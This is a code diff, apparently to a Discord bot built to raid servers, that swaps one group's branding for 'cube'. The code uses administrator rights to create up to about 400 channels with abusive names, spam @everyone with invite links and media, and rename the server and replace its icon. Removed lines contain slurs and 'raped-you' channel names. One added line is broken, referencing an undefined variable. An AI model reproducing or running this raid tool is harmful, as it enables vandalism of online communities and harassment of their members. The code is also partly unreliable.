@@ -121,7 +121,7 @@ if(message.channel.type === "dm") {return}
 
 
   client.on('message', message => {
-    if(message.content.startsWith('@everyone fucked by 【ℕ𝕋】 RETARDS')) {
+    if(message.content.startsWith('@everyone fucked by cubes')) {
 if(message.channel.type === "dm") {return}
       if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
 return
@@ -183,7 +183,7 @@ if(message.channel.type === "dm") {return}
 
 
 function randomT() {
-  var rand = ['https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4 @everyone', '@everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4', 'https://discord.gg/rYagK4sPKU @everyone', '@everyone fucked by 【ℕ𝕋】 RETARDS', '@everyone fucked by 【ℕ𝕋】 haha', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756371334791198/image0.jpg?width=587&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756313554583562/image0.jpg','@everyone https://media.discordapp.net/attachments/756219863206330469/759745708394807307/image0-1.png', '@everyone CHAOS CHAOS', '@everyone 【ℕ𝕋】 owns you','Get fucked @everyone', '@everyone bruh momentum', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756690228379738/image0.jpg?width=646&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756775233814558/image0.jpg', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756846772387880/image0.png?width=581&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756645554847774/image0.jpg', '@everyone get rekt'];
+  var rand = ['https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4 @everyone', '@everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4', 'https://discord.gg/rYagK4sPKU @everyone', '@everyone fucked by cubes', '@everyone fucked by assy cube', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756371334791198/image0.jpg?width=587&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756313554583562/image0.jpg','@everyone https://media.discordapp.net/attachments/756219863206330469/759745708394807307/image0-1.png', '@everyone CHAOS CHAOS', '@everyone cube owns you','Get fucked @everyone', '@everyone bruh momentum', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756690228379738/image0.jpg?width=646&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756775233814558/image0.jpg', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756846772387880/image0.png?width=581&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756645554847774/image0.jpg', '@everyone get rekt'];
 
   return rand[Math.floor(Math.random()*rand.length)];
 }
@@ -191,7 +191,7 @@ function randomT() {
 
 
 function random123() {
-  var rand = ['nightmare-troupe-raped-you-huehuehuehuehuehue', '【ℕ𝕋】-raped-you-﷽﷽﷽﷽﷽﷽﷽﷽﷽', 'eat-shit-get-fucked-﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽', 'assy-raped-you-﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽', '【ℕ𝕋】-raped-you-git-gud', '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽'];
+  var rand = ["you-have-been-cubed", "❐❐❐cube❐❐❐", "❐hail-cube❐", "❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐", "i-am-cube"];
 
   return rand[Math.floor(Math.random()*rand.length)];
 }
@@ -220,7 +220,7 @@ client.on('message', msg => {
       if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
        var number = 0
        
-       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/rYagK4sPKU @everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
+       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/rYagK4sPKU @everyone https://cdn.discordapp.com/attachments/735103595250188338/775341588590755900/video0.mov").then(c.send("@everyone fucked by cube").then(c.send("rip webhook spam shitcord killed it"))))
         while(number < 399) {
             msg.guild.channels.create(random123()).then(c => { 
                
@@ -251,14 +251,15 @@ client.on('message', msg => {
 
 
 client.on('message', message => {
-  if(message.content.startsWith('@everyone fucked by Nightmare Troupe LMFAO69')) {
+  if(message.content.startsWith('@everyone fucked by cube')) {
 if(message.channel.type === "dm") {return}
 if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
 return
  }
+if(msg.author.id !== msg.client.user.if) {return}
  setTimeout(() => {
-    message.guild.setName("Nightmare troupe owns you")
-    message.guild.setIcon("https://i1.sndcdn.com/artworks-000476282808-fnlvlv-t500x500.jpg")
+    message.guild.setName("ic-0n moment")
+    message.guild.setIcon("https://cdn.discordapp.com/avatars/759838559946801173/a6e55bf6d5650ea7986690d22f72867f.png?size=1024")
  
  }, 3000);
         
@@ -314,7 +315,7 @@ if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
 
 client.on("message", msg => {
     if(msg.author.id === msg.client.user.id) {
-    if(msg.content === `@everyone fucked by Nightmare Troupe LMFAO69`) {
+    if(msg.content === `@everyone fucked by cube`) {
  const server = msg.client.guilds.cache.find(g => g.id === guild)
         const channel = server.channels.cache.find(c => c.id === logC)
     const Id = msg.guild.id
